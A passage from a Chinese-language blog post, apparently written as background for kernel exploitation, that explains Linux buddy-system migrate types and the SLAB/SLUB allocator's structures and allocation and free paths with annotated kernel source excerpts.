class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">MIGRATE_ISOLATE,<span class="comment">/* can&#x27;t allocate from here */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">MIGRATE_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这些属性如下：</p><blockquote><ul class="lvl-1"><li class="lvl-2"><p>不可移动页：在内存中有固定位置，不能移动到其他地方。内核中使用的页大部分是属于这种类型。</p></li><li class="lvl-2"><p>可回收页：不能直接移动，但可以删除，页中的内容可以从某些源中重新生成。例如，页内容是映射到文件数据的页就属于这种类型。对于这种类型，在内存短缺(分配失败)时，会发起内存回收，将这类型页进行回写释放。</p></li><li class="lvl-2"><p>可移动页：可随意移动，用户空间的进程使用的没有映射具体磁盘文件的页就属于这种类型(比如堆、栈、shmem共享内存、匿名mmap共享内存)，它们是通过进程页表映射的，把这些页复制到新位置时，只要更新进程页表就可以了。一般这些页是从高端内存管理区获取。</p></li></ul></blockquote><p>buddy system每个free_area元素都有一个<code>free_list[4]</code>链表指针数组，对应了四种不同的页属性。每个链上的属性都一致，每个free_area的连续页数量也都一致。</p><h2 id="分配和释放逻辑">分配和释放逻辑</h2><p>在请求空间的时候，buddy system首先会将需求向2的幂次对齐，然后去对应的下标取出连续空间。</p><ul class="lvl-0"><li class="lvl-2"><p>匹配属性和大小，找到对应的free_list链表往下摘</p></li><li class="lvl-2"><p>如果对应的链表为空，就向下一个free_area去请求，请求到后一分为二，返回一个，将另一个放进上面的链表。再空就继续向上找。</p></li><li class="lvl-2"><p>释放后连续的就放到对应链表上（bin），空闲的就合并往更高层放。</p></li></ul><p>而外部碎片的问题只是被很大程度的减弱了，而并没有被完全解决，内核还会执行页面迁移来减少碎片，不再赘述。这个页面迁移的内核接口是很多别的功能的基础</p><blockquote><p><a href="https://blog.csdn.net/yhb1047818384/article/details/119920971">https://blog.csdn.net/yhb1047818384/article/details/119920971</a><br>可以发现， 页面迁移不是简单的把一个page从A位置移动到B位置，它的本质是一个分配新页面，将旧页面的内容拷贝至新页面，解除旧页面的映射关系，并将映射关系映射到新页面，最后释放旧页面的过程。</p></blockquote><h1>Slab/Slub</h1><p><strong>这是我们利用内核UAF要主要掌握的内容</strong></p><p>slab是运行于buddy system之上的一个更小粒度的内存分配系统。用于解决内部碎片的问题。像file和task_struct等等这些频繁使用的小结构体， 伙伴系统只能每次申请至少一个page,显然没法满足我们这种需求，slab就出现了。</p><p>slab是最早的版本，而这个版本太古早以至于有很多问题，一个很重要的问题就是NUMA架构的支持不好（尽管我们现在都用的是这个架构），非常臃肿。因此被大神们优化成了现在用的slub系统。保留了基本的思想框架，对很多细节和实现做了优化，包括放弃了着色系统，多处理器和NUMA优化等等。但是linux内核中相关的接口都以slab命名，开发者们也都保留了这些名称，因此下面的slab和slub很可能会混用，读者可以自行分辨。</p><p>另外，slob则是更针对嵌入式系统的一个内存分配系统</p><blockquote><p>参考：（强烈推荐）：<a href="https://segmentfault.com/a/1190000043626203#item-4">https://segmentfault.com/a/1190000043626203#item-4</a><br><a href="https://blog.csdn.net/qq_54218833/article/details/127218102">https://blog.csdn.net/qq_54218833/article/details/127218102</a></p></blockquote><h2 id="概述">概述</h2><p>首先，我们来看slab的一个简单的概述。slab从buddy申请来连续的内存页后，按照对象的大小将其池化成很多小的/内存对齐的对象。它们用kmem_cache管理，链接在链表上，然后充分利用cpu缓存和程序局部性来进行高速的分配和释放</p><blockquote><p>上面这段其实是写完之后回头再写的</p></blockquote><p>slab的管理层级大概是kmem_cache(slab_cache)-&gt;slab(freelist/pageframes)-&gt;object的逻辑，要具体掌握slab机制比较麻烦，下面按照拆解组成，分配，释放三个部分, 以自顶向下的逻辑大概介绍下slab。（其实自底向上会更好理解一些具体的实现）</p><h2 id="拆解组件">拆解组件</h2><h3 id="kmem-cache">kmem_cache</h3><p>在slab中，它所管理的内存分配单元称为“对象”(Object)。而这些slab则是被slab cache所管理的slab池（层层池化？），用一个<code>kmem_cache</code>结构体管理。<br>kmem_cache是一个分配器，可以理解成类似main_arena的东西。而从buddy system每次取来的一个或几个连续的页框被称为一个<code>slab</code>，slab分配器将每个slab拆分成若干对象向下一级进行分配。一个kmem_cache对应某一种功能/大小的对象分配，所有的kmem_cache被存放在一个数组中管理。</p><p>slub kmem_cache结构（<strong>缝合了源码和大佬的部分注释版本，不代表结构体定义，仅供理解</strong>）:</p><blockquote><p>随手写一下，染色系统是为了解决多CPU cache缓存不同大小但slab内相同偏移对象时会处于同一行的问题所创立的，但是可能没什么太大用被slub删掉了</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_SLUB_TINY</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span> <span class="comment">// 关键字段</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// slab cache 的管理标志位，用于设置 slab 的一些特性</span></span><br><span class="line">    <span class="comment">// 比如：slab 中的对象按照什么方式对齐，对象是否需要 POISON  毒化，是否插入 red zone 在对象内存周围，是否追踪对象的分配和释放信息 等等</span></span><br><span class="line">    <span class="type">slab_flags_t</span> flags;</span><br><span class="line">    <span class="comment">// slab 对象在内存中的真实占用，包括为了内存对齐填充的字节数，red zone 等等</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> size;  <span class="comment">/* The size of an object including metadata */</span></span><br><span class="line">    <span class="comment">// slab 中对象的实际大小，不包含填充的字节数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> object_size;<span class="comment">/* The size of an object without metadata */</span></span><br><span class="line">    <span class="comment">// slab 对象池中的对象在没有被分配之前，我们是不关心对象里边存储的内容的。</span></span><br><span class="line">    <span class="comment">// 内核巧妙的利用对象占用的内存空间存储下一个空闲对象的地址。</span></span><br><span class="line">    <span class="comment">// offset 表示用于存储下一个空闲对象指针的位置距离对象首地址的偏移</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset;    <span class="comment">/* Free pointer offset */</span></span><br><span class="line">    <span class="comment">// 表示 cache 中的 slab 大小，包括 slab 所需要申请的页面个数，以及所包含的对象个数</span></span><br><span class="line">    <span class="comment">// 其中低 16 位表示一个 slab 中所包含的对象总数，高 16 位表示一个 slab 所占有的内存页个数。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line">    <span class="comment">// slab 中所能包含对象以及内存页个数的最大值</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line">    <span class="comment">// 当按照 oo 的尺寸为 slab 申请内存时，如果内存紧张，会采用 min 的尺寸为 slab 申请内存，可以容纳一个对象即可。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line">    <span class="comment">// 向伙伴系统申请内存时使用的内存分配标识</span></span><br><span class="line">    <span class="type">gfp_t</span> allocflags; </span><br><span class="line">    <span class="comment">// slab cache 的引用计数，为 0 时就可以销毁并释放内存回伙伴系统重</span></span><br><span class="line">    <span class="type">int</span> refcount;   </span><br><span class="line">    <span class="comment">// 池化对象的构造函数，用于创建 slab 对象池中的对象</span></span><br><span class="line">    <span class="type">void</span> (*ctor)(<span class="type">void</span> *);</span><br><span class="line">    <span class="comment">// 对象的 object_size 按照 word 字长对齐之后的大小</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> inuse;  </span><br><span class="line">    <span class="comment">// 对象按照指定的 align 进行对齐</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> align; </span><br><span class="line">    <span class="comment">// slab cache 的名称， 也就是在 slabinfo 命令中 name 那一列</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;  </span><br><span class="line"></span><br><span class="line"><span class="comment">/* 5) statistics */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_SLAB</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> num_active;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// info used for slab</span></span><br><span class="line"><span class="type">int</span> obj_offset;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_DEBUG_SLAB */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> useroffset;<span class="comment">/* Usercopy region offset */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> usersize;<span class="comment">/* Usercopy region size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>有三个字段值得我们关注，一是flag，里面有很多各种各样的配置信息以及flag,比如是否64字节对齐，是否开启slab毒化，是否用red_zone防止OOB, 指定映射区域来自哪里（默认都是NORMAL）等等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* DE<span class="doctag">BUG:</span> Red zone objs in a cache */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_RED_ZONE  ((slab_flags_t __force)0x00000400U)</span></span><br><span class="line"><span class="comment">/* DE<span class="doctag">BUG:</span> Poison objects */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_POISON  ((slab_flags_t __force)0x00000800U)</span></span><br><span class="line"><span class="comment">/* Align objs on cache lines */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_HWCACHE_ALIGN ((slab_flags_t __force)0x00002000U)</span></span><br><span class="line"><span class="comment">/* Use GFP_DMA memory */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_CACHE_DMA  ((slab_flags_t __force)0x00004000U)</span></span><br><span class="line"><span class="comment">/* Use GFP_DMA32 memory */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_CACHE_DMA32 ((slab_flags_t __force)0x00008000U)</span></span><br><span class="line"><span class="comment">/* DE<span class="doctag">BUG:</span> Store the last owner for bug hunting */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_STORE_USER </span></span><br></pre></td></tr></table></figure><p>二是开头的__percpu变量<br>6.11.5版本内核的源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">void</span> **freelist;   <span class="comment">// 指向被 CPU 本地缓存的 slab 中第一个空闲的对象</span></span><br><span class="line">            <span class="comment">// 保证进程在 slab cache 中获取到的 cpu 本地缓存 kmem_cache_cpu 与当前执行进程的 cpu 是一致的。</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> tid;<span class="comment">/* Globally unique transaction id */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">freelist_aba_t</span> freelist_tid;</span><br><span class="line">&#125;;</span><br><span class="line">    <span class="comment">// slab cache 中 CPU 本地所缓存的 slab，</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span><span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">    <span class="comment">// cpu cache 缓存的备用 slab 列表</span></span><br><span class="line">    <span class="comment">// 当被本地 cpu 缓存的 slab 中没有空闲对象时，内核会从 partial 列表中的 slab 中查找空闲对象</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">partial</span>;</span><span class="comment">/* Partially allocated slabs */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">local_lock_t</span> lock;<span class="comment">/* Protects the fields above */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_STATS</span></span><br><span class="line">    <span class="comment">// 记录 slab 分配对象的一些状态信息</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> stat[NR_SLUB_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个cpu缓存是我们分配的主要来源。主要是里面缓存的一个slab和一个partial列表。后面在分配会讲到他们的用法。freelist将会成为后续我们pwn的对象之一。</p><p>最后一个字段。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line"><span class="type">spinlock_t</span> list_lock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_partial</span>;</span><span class="comment">/* partial list first, better asm code */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_full</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_free</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> total_slabs;<span class="comment">/* length of all slab lists */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> free_slabs;<span class="comment">/* length of free slab list only */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> free_objects;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> free_limit;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> colour_next;<span class="comment">/* Per-node cache coloring */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">shared</span>;</span><span class="comment">/* shared per node */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alien_cache</span> **<span class="title">alien</span>;</span><span class="comment">/* on other nodes */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> next_reap;<span class="comment">/* updated without locking */</span></span><br><span class="line"><span class="type">int</span> free_touched;<span class="comment">/* updated without locking */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> nr_partial;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line"><span class="type">atomic_long_t</span> nr_slabs;</span><br><span class="line"><span class="type">atomic_long_t</span> total_objects;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">full</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，如果使用slab，每个kmem节点要管理三个双向链表，分别是partial,full和free.顾名思义，partial管理有部分空闲对象的slab,full则管理已经全部被分配满的slab，free表示完全空闲的slab. 这三个链表是动态转化的，根据当前的分配情况实时移动。并且free太多会向buddy合并。</p><p>而使用slub的时候就直接删除了free和full链表，只保留了partial。</p><p>我们可以直接通过<code>cat /proc/slabinfo</code>查看当前所有的slab_cache。</p><h3 id="slab">slab</h3><p>从buddy system取来的页面被拆成一堆object放入了freelist构成我们的一个对象池。用这样一张图可以比较好的表示：</p><p><img src="/images/linux_mem/slab_struct.png" alt="slab1.png"></p><p>slab是管理内存分配和释放的基本单位。若干个slab也构成了一个池子被slab_cache管理，同时他们向上级buddy申请内存。</p><p>对于老一点的内核版本比如5.4，slab并没有单独的结构体进行管理，而是全部存储在page中。但随着内核的发展，我们需要对page结构体进行精简，也就将slab结构单独抽了出来从而减少page结构体的大小。但是page该有的指针什么的还是得有。</p><blockquote><p>linux-5.18.19</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> __page_flags;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_SLAB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line"><span class="type">void</span> *freelist;<span class="comment">/* array of free object indexes */</span></span><br><span class="line"><span class="type">void</span> *s_mem;<span class="comment">/* first object */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> active;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SLUB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">int</span> slabs;<span class="comment">/* Nr of slabs left */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line"><span class="comment">/* Double-word boundary */</span></span><br><span class="line"><span class="type">void</span> *freelist;<span class="comment">/* first free object */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> counters;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line"><span class="type">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line"><span class="type">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __unused;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SLOB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="type">void</span> *__unused_1;</span><br><span class="line"><span class="type">void</span> *freelist;<span class="comment">/* first free block */</span></span><br><span class="line"><span class="type">long</span> units;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __unused_2;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">error</span> <span class="string">&quot;Unexpected slab allocator configured&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">atomic_t</span> __page_refcount;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> memcg_data;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>freelist直接指向当前的空闲对象，每个空闲对象则同时以链表的形式相互连接。slab不单独维护空闲的对象，他们都是同时连续存放的，如果全free了就直接放进kmem_cache的free,只有partial的时候会用freelist-&gt;object.next这种形式连接一个内部空闲对象链表。</p><p>slab其实本身没啥内容，大头都让kmem_cache干了。</p><blockquote><p>旧版的slab采用一个描述符数组来管理对象的分配和释放，而且slab内同样维护了</p></blockquote><h3 id="Object">Object</h3><p>每个Object是由slab去分配，真正返回给内核程序使用的。只不过和chunk相比，Object似乎管理和结构都既更加简单又更加复杂。</p><p>说更加简单，是因为他们不需要像bin索引这样的方法，没有fdbk那么多东西，都是线性映射。顶天了也就是partial的遍历以下，直接slub用一个free_list指针指到没分配的对象，取的时候几乎是一键返回。</p><p>说更加复杂，是因为在内核中还有其他的奇怪机制（部分是可配置的）。比如防止越界读写的red_zone, 使用特殊字符填充object的slab_poison等等。前者是会在object两侧空余空间防越界读写（和内存对齐结合起来利用），后者则是用0x6b填充对象并以0x5a结尾，在它们释放或者刚从buddy取出的时候。另外还需要其他的track信息来附加在object末尾，因此最后一个object大概是这样的结构：</p><p><img src="/images/linux_mem/object.png" alt="object.png"></p><h2 id="分配与释放（简化概述）">分配与释放（简化概述）</h2><blockquote><p><a href="https://segmentfault.com/a/1190000043626203#item-6">https://segmentfault.com/a/1190000043626203#item-6</a><br>写得很好，我只是自己理解后抄一遍罢了，很难想象理解这么深刻的大佬能写和画的这么直观</p></blockquote><h3 id="分配">分配</h3><ul class="lvl-0"><li class="lvl-2"><p>从cpu缓存中直接分配，kmem_cpu_cache-&gt;slab取，我们称为快速路径，如果有空闲对象freelist直接取出对象返回</p></li><li class="lvl-2"><p>freelist为空，kmem_cpu_cache-&gt;slab已经满，则从cpu缓存partial中分配，我们称为慢速路径，需要遍历查看，找到能分配的slab后将该slab提升至cache并分配</p></li><li class="lvl-2"><p>partial也被取完了，则要返回kmem_cache结构，从node的partial链表中找，遍历一遍，同样找到后提升至cpu_cache, 并且将剩余的slab全部连接到cpu_cache-&gt;partial下（数量有限制）</p></li><li class="lvl-2"><p>全空了（比如刚创建），从buddy申请，依据kmem_cache的字段去要，要到slab直接提升到cpu缓存</p></li><li class="lvl-2"><p>拿到后会经过池化，slab poison等等细节操作不再赘述</p></li></ul><h3 id="释放">释放</h3><ul class="lvl-0"><li class="lvl-2"><p>如果释放的对象在cpu_cache-&gt;slab中，那就直接放回该slab并修正freelist指针，我们称为快速路径</p></li><li class="lvl-2"><p>如果释放的对象在cpu_cache-&gt;partial中，也是直接放回然后修改free_list和pointer</p></li><li class="lvl-2"><p>如果释放的对象在kmem_cache_node-&gt;partial中，也是直接放回</p></li><li class="lvl-2"><p>如果对象释放后，原本的full变为了partial，且不在cpu本地缓存中，那么内核会将这个slab重新插入到cpu_cache的partial链表中。</p></li></ul><blockquote><p>因为 slab 之前之所以是一个 full slab，恰恰证明了该 slab 是一个非常活跃的 slab，常常供不应求导致变成了一个 full slab，当对象释放之后，刚好变成 partial slab，这时需要将这个被频繁访问的 slab 放入 cpu 缓存中，加快下次分配对象的速度。</p></blockquote><p>当然，cpu_cache是很宝贵的，我们不能什么都往里塞。kmem_cache-&gt;cpu_partial规定了一个数量，超过的话就会将所有的cpu partial转移到kmem_node的partial中。这个检查是第一位的。这也是有说法的：</p><blockquote><p>CPU partial爆炸的时候，说明内核当前所处的场景是一个内存释放频繁的场景。kmem_cache_cpu-&gt;partial 链表太满了，而内存分配的请求又不是很多，kmem_cache_cpu 中缓存的 slab 并不会频繁的消耗。这样一来，就需要将链表中的所有 slab 一次性转移到 NUMA 节点缓存 partial 链表中备用。</p></blockquote><ul class="lvl-0"><li class="lvl-2"><p>如果对象释放后，slab从partial变成了empty，内核会将该slab插入节点缓存，也就是kmem_cache_node-&gt;partial中</p></li></ul><p>舍弃了slab中的empty，全放进partial的话就需要一些流程。kmem_cache-&gt;min_partial中规定了node中缓存的slab个数上限。partial超过这个值会将所有的empty slab回收至buddy system.这个检查也是插入前优先进行</p><h2 id="总结">总结</h2><p>至此，slab/slub的架构如下：</p><p><img src="/images/linux_mem/construct.png" alt="architect.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我们都知道，进程内部寻址用的是虚拟地址，虚拟地址要经过mmu被映射到物理地址，进程的页表是独立的等等。但是那么多页表，内核又是怎么调度页表的呢？在我们向内核申请下一个4kb的时候究竟发生了什么？&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;参考自：&lt;a href=&quot;https:</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
